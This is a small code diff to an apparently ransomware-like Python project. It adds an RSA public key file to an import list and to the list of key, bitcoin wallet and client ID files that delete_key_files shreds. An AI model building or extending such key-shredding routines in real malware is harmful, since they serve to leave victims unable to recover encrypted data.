@@ -13,6 +13,7 @@ from core.config import (
     UNENCRYPTED_AES_KEY_FILE_LOCATION,
     ENCRYPTED_BITCOIN_KEY_LOCATION,
     BITCOIN_WALLET_ID_PATH,
+    LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION,
     CLIENT_ID_LOCATION,
 )
 
@@ -70,6 +71,7 @@ def delete_key_files():
         ENCRYPTED_BITCOIN_KEY_LOCATION,
         BITCOIN_WALLET_ID_PATH,
         CLIENT_ID_LOCATION,
+        LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION
     ]
     for file in list_of_important_files:
         shred_file(file)
